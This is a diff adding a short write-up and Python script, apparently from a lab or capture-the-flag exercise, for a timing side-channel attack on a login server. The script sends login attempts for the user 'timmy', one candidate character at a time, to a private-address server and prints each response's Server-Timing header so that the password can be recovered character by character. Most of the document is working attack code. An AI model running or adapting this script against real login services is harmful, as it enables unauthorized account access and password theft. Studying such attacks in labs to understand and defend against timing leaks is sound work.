@@ -1,0 +1,36 @@
+This explores attacking a server through side channel means by exploiting the time that server takes to evaluate each character of the entered password.
+The python script takes input of cookie details and post request details and outputs us the time taken by the server for each character.
+Longer time for a character suggests that it is a right combination.
+This right combination of letter is feeded in the code and the code is run again to find the next character.
+In this way, the right password is framed through time processing.
+
+Code:
+
+import requests
+import json
+import pandas as pd
+params = {'Host': '192.168.1.77:5003',
+'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Language': 'en-US,en;q=0.5',
+'Accept-Encoding': 'gzip, deflate' ,}
+
+
+headers ={'Content-Type': 'application/x-www-form-urlencoded'}
+url1='http://192.168.1.77:5003/token'
+url2='http://192.168.1.77:5003/login'
+
+
+data1={"token":""}
+
+cookie={'hacker_token':''}
+response1 = requests.post(url=url1,params=params,data=data1,headers=headers)
+
+
+s= '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()-_=+[]\{}|;:",./<>?'
+for c in s:
+        data2={"username":'timmy',"password":c}
+
+        response2 = requests.post(url=url2,params=params,data=data2,headers=headers,cookies=cookie)
+#       print(response2.headers)
+        print(c,response2.headers['Server-Timing'])
